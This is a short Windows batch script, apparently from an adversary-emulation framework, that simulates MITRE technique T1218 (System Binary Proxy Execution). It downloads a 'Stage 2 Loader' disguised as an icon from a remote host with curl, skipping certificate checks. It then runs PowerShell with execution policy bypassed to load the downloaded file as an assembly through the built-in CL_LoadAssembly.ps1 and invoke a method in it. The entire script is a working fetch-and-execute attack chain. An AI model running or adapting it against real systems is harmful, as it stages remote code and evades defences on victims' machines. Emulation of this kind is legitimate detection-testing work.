@echo off
setlocal enabledelayedexpansion

REM -- SET-var preamble: random-named variables for each PHR_ placeholder --
SET xkfhrs=ITZEL-S2B
SET lpqmkw=10302
SET nvzqgt=7
SET wytbcd=%APPDATA%\10302\e3acc4bc
SET jrqpzu=c2f79128.txt
SET hgvckl=https://10.0.0.49/stage/2/icon.png?10302-7
SET mzxodp=%APPDATA%\7\macula-simulations.log
SET sfybng=%APPDATA%\7
SET utvqxr=Microsoft.Win32.TaskScheduler.NativeBridge
SET qlpfky=Dale
SET twnjoe=https://10.0.0.49

REM -- Timestamp helper --
for /f "tokens=1-6 delims=/:. " %%a in ("%date% %time%") do set tsvar=%%a-%%b-%%c_%%d:%%e:%%f

REM -- Determine log file path --
set logpath=%APPDATA%\!nvzqgt!\macula-simulations.log

REM -- Heartbeat fetch (downloads Stage 2 Loader) --
echo [!tsvar!][DEBUG][!xkfhrs!][!lpqmkw!]: heartbeat_start >> "!logpath!" 2>nul
curl -k -s -o "!wytbcd!\!jrqpzu!" "!hgvckl!"
echo [!tsvar!][DEBUG][!xkfhrs!][!lpqmkw!]: heartbeat_complete >> "!logpath!" 2>nul

REM -- Change directory to output location --
cd /d "!wytbcd!"
echo [!tsvar!][DEBUG][!xkfhrs!][!lpqmkw!]: chdir_result=!errorlevel! >> "!logpath!" 2>nul

REM -- LOLBIN invocation (PowerShell via CL_LoadAssembly.ps1) --
echo [!tsvar!][DEBUG][!xkfhrs!][!lpqmkw!]: lolbin_start >> "!logpath!" 2>nul
powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath %APPDATA%\10302\e3acc4bc\c2f79128.txt;[Microsoft.Win32.TaskScheduler.NativeBridge]::Dale()"
set lolbin_rc=!errorlevel!
echo [!tsvar!][DEBUG][!xkfhrs!][!lpqmkw!]: lolbin_complete=!lolbin_rc! >> "!logpath!" 2>nul

REM -- TTP completion log for T1218 --
if !lolbin_rc! equ 0 (
    echo [!tsvar!][TTP][!xkfhrs!][!lpqmkw!]: T1218^|System Binary Proxy Execution=[OK]:[] >> "!logpath!" 2>nul
) else (
    echo [!tsvar!][TTP][!xkfhrs!][!lpqmkw!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed] >> "!logpath!" 2>nul
)

endlocal